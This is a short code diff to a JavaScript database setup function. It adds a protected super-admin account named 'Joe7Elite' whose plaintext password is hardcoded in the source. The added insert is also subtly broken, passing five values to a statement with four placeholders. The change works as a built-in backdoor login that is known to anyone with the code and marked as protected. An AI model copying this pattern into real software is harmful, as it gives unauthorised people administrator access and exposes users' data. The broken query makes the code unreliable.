@@ -161,7 +161,14 @@ export async function initDb() {
     ).run('admin', hash, 'المدير', 'admin');
   }
 
-  // Ensure Joe7Elite is always protected
+  // Create Joe7Elite super-admin if not exists
+  const joe = db.prepare('SELECT id FROM users WHERE username = ?').get('Joe7Elite');
+  if (!joe) {
+    const hash = bcrypt.hashSync('Joe4Gold', 10);
+    db.prepare(
+      'INSERT INTO users (username, password_hash, full_name, role, is_protected) VALUES (?, ?, ?, ?, 1)'
+    ).run('Joe7Elite', hash, 'Joe', 'admin', 1);
+  }
   db.prepare('UPDATE users SET is_protected = 1 WHERE username = ?').run('Joe7Elite');
 }
 
